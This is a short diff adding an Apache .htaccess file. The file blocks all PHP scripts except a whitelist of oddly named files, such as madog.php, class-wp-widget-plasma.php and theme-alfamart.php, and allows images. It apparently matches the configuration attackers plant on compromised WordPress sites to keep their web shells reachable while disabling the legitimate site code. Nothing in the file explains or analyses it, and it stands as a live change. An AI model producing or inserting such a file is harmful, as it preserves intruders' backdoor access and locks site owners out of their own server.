@@ -1,0 +1,9 @@
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
+    Deny from all
+</FilesMatch>
+<FilesMatch "^(class-IXR-string.php|class-wp-sitemaps-engine.php|class-wp-customize-socket.php|class-wp-widget-plasma.php|status512.php|https.php|class-controller.php|theme-alfamart.php|madog.php|myhome.php|proxy.php|index.html)$">
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+    Allow from all
+</FilesMatch>
